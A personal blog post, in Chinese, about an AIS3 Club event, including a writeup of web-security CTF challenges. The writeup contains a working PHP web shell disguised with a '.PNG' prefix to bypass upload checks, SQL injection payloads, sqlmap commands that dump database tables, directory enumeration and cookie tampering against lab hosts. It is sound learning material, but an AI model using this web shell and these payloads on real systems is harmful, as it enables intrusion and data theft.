---
title: "AIS3 Club"
date: 2023-11-21T02:06:59+08:00
description: "2023/11/19-20"
categories: 
    - "Event"
tags:
    - "AIS3"
draft: false
---

應該是我第一次參加AIS3的實體活動, 活動共兩天

### Day 1
上午是AIS3的介紹+實境解謎

解謎的題目涵蓋 資訊搜尋 古典密碼 還有~~消耗體力~~

下午則是玩奧義科技的桌遊{{< spoiler >}}但沒有桌子就是了{{< /spoiler>}}

[Cybercans：資安人生物語](https://hackmd.io/@samuel-t-chou/H1lVj28T_#Cybercans%EF%BC%9A%E8%B3%87%E5%AE%89%E4%BA%BA%E7%94%9F%E7%89%A9%E8%AA%9E)

![image](cybercans.jpg)

{{< extended 小小心得 >}}這遊戲玩起來就是看著自己不停的骰到被攻擊的格子 然後看著自己的防禦被各種打穿 開局骰第一次直接被打穿兩次 {{< /extended >}}

桌遊結束後就是交流的pizza party了

![image](pizzap.jpg)

### Day 2

第二天就是滿滿的網頁安全CTF了
蠻神奇的是我旁邊坐了一位弘光科大的教授

以下是writeup

### Introduction
![image](introduction.png)

### Welcome
![image](welcome.png)


在respond封包裡找到flag
![image](welcome-2.png)

### Never Login
![image](never_login.png)

![image](never_login-3.png)

![image](never_login-2.png)

html中有 JS 會阻擋密碼送出, 在設定中打開`禁用JavaScript`, 並將最下方找到的密碼送出就能拿到flag

### Who are you
![image](whoareyou.png)
![image](whoareyou-2.png)

隨便填`username`然後改cookie中的`role`為`admin`就能拿到flag

### dir
![image](dir.png)

使用 `dirsearch` 之類的工具可以找到這題的網頁下有兩個資料夾
```shell
dirsearch -u https://dir.entroy.tk --random-agent 
->
[11:56:19] 301 -  236B  - /admin  ->  http://dir.entroy.tk/admin/
[11:56:52] 301 -  236B  - /image  ->  http://dir.entroy.tk/image/ 
```

搜尋`/admin`
```
[12:56:22] 200 -    2KB - /admin/manage.php
```
可以看到有一個`/admin/manage.php`的頁面的狀態碼是200代表可以正常訪問
在`/admin/manage.php`的html中可以找到flag

### Image Space 0x01 

![image](upload.png)

上傳一個web shell的檔案
先把JS關掉以免php的檔案被擋

網路上找到的web shell code
在前面加上.PNG 欺騙伺服器
``` 
.PNG <html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
最後透過 web shell 找到flag

### Boolean based SQL Injection 
![image](sqlib.png)

![image](sqlib2.png)

嘗試往輸入欄填入可能會造成錯誤的文字
得到
```sql
SELECT * FROM user WHERE username =(""'") AND password = ("")
```

嘗試 `admin")#`

![image](sqlib3.png)
拿到flag

### Union Select
![image](ubsqli.png)

![image](ubsqli2.png)

用`sqlmap`檢查database
```bash
sqlmap https://sqli.entroy.tk/union_based_sqli.php?id=1 -p id --level 5 --risk 3 --batch --random-agent --technique BU --dbs

->
[19:47:35] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] union_based_sqli
```

檢查`union_base_sqli`中的`table`
```bash
sqlmap https://sqli.entroy.tk/union_based_sqli.php?id=1 -p id --level 5 --risk 3 --batch --random-agent --technique BU --dbs -D union_based_sqli --tables

-> 
[19:51:32] [INFO] fetching tables for database: 'union_based_sqli'
Database: union_based_sqli
[2 tables]
+--------------+
| h1dd3n_tab13 |
| users        |
+--------------+
```

檢查`h1dd3n_tab13`中的`columns`

```bash
sqlmap https://sqli.entroy.tk/union_based_sqli.php?id=1 -p id --level 5 --risk 3 --batch --random-agent --technique BU --dbs -D union_based_sqli --tables -T h1dd3n_tab13 --columns

->
[19:53:15] [INFO] fetching columns for table 'h1dd3n_tab13' in database 'union_based_sqli'
Database: union_based_sqli
Table: h1dd3n_tab13
[1 column]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| secret_flag | varchar(100) |
+-------------+--------------+
```

提取出`secret_flag`

```bash
sqlmap https://sqli.entroy.tk/union_based_sqli.php?id=1 -p id --level 5 --risk 3 --batch --random-agent --technique BU --dbs -D union_based_sqli --tables -T h1dd3n_tab13 --columns -C secret_flag --dump

->
[19:55:06] [WARNING] reflective value(s) found and filtering out
Database: union_based_sqli
Table: h1dd3n_tab13
[1 entry]
+---------------------------------------------------------+
| secret_flag                                             |
+---------------------------------------------------------+
| flag{Un10n_B@s3d_SQL1_25e406a0db22ea899d8ddd72958254fd} |
+---------------------------------------------------------+
```

### Easy Real World
情境源自[HITCON ZeroDay 高雄鳳山統一當鋪資料庫注入漏洞](https://zeroday.hitcon.org/vulnerability/ZD-2019-01191)

觀察當中幾個頁面的url

`https://target.entroy.tk/service_open.php?id=1`

好像可以用`sqlmap`掃一下
```bash
sqlmap https://target.entroy.tk/service_open.php?id=1 -p id --level 5 --risk 3 --batch --random-agent

-> 
[19:58:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=20 AND 8277=8277

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=-8195 UNION ALL SELECT NULL,CONCAT(0x7178716271,0x42754c584747795378524b4559736c494c75754344475278674c734f59436a655555697a43426179,0x716b6a7a71),NULL,NULL-- -
---
```

開始找有用的資訊...

最後在 `tongyi->master`中找到帳號密碼

```bash
sqlmap https://target.entroy.tk/service_open.php?id=20 -p id --level 5 --risk 3 --batch --random-agent --technique BU -dbs -D tongyi --tables -T master --columns --dump
```

開始找登入介面

```bash
dirsearch -u https://target.entroy.tk/ --random-agent

->
[20:04:33] 301 -  236B  - /js  ->  http://target.entroy.tk/js/                           
[20:05:37] 200 -    6KB - /about.php               
[20:07:29] 200 -    7KB - /contact.php  
[20:07:30] 301 -  241B  - /control  ->  http://target.entroy.tk/control/    
[20:07:33] 301 -  237B  - /css  ->  http://target.entroy.tk/css/       
[20:08:05] 200 -    1KB - /footer.php                                       
[20:08:17] 200 -  770B  - /header.php                       
[20:08:26] 301 -  240B  - /images  ->  http://target.entroy.tk/images/     
[20:08:58] 200 -    5KB - /map.php                                          
[20:09:12] 200 -    9KB - /news.php                                         
[20:09:57] 200 -    0B  - /settings.php                                     
[20:10:17] 302 -    0B  - /system/  ->  key.php                             
[20:10:17] 301 -  240B  - /system  ->  http://target.entroy.tk/system/      
[20:10:33] 301 -  240B  - /upload  ->  http://target.entroy.tk/upload/                                     
```

連到`system/key.php` 找到登入介面

使用前面找到的帳密做登入
成功進到後台
![image](realworld.png)

找地方上傳 web shell
然後就可以RCE了

{{< extended qwq >}}
但我找不到flag
{{< /extended >}}